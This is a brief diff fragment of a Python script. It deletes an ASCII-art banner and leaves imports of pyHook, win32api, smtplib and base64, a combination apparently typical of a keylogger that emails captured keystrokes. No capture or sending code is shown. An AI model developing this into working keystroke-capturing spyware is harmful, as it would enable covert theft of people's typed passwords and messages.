@@ -1,17 +1,3 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
-
-"""
-.d88888b                             oo   dP            
-88.    "'                                 88            
-`Y88888b. .d8888b. dP    dP 88d888b. dP d8888P dP    dP 
-      `8b 88'  `88 88    88 88'  `88 88   88   88    88 
-d8'   .8P 88.  .88 88.  .88 88    88 88   88   88.  .88 
- Y88888P  `8888P88 `88888P' dP    dP dP   dP   `8888P88 
-                88                                  .88 
-                dP                              d8888P 
-"""
-
 import sys
 import win32api,pythoncom
 import pyHook,os,time,random,smtplib,string,base64
